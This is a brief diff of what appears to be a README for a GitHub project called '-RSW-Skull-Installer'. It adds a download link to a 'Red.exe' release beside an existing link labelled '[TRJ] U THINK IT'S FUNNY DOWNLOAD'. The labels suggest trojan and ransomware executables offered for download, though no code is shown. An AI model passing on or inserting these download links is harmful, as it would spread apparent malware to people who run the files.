@@ -10,7 +10,7 @@
 
 [[TRJ] U THINK IT'S FUNNY DOWNLOAD](https://github.com/TRM-CREATOR/-RSW-Skull-Installer/releases/download/0/UTHINKIT.SFUNNY.exe).
 
-[COMING SOON](https://COMING-SOON).
+[Red.exe](https://github.com/TRM-CREATOR/-RSW-Skull-Installer/releases/download/666/Red.exe).
 
 [COMING SOON](https://COMING-SOON).
 
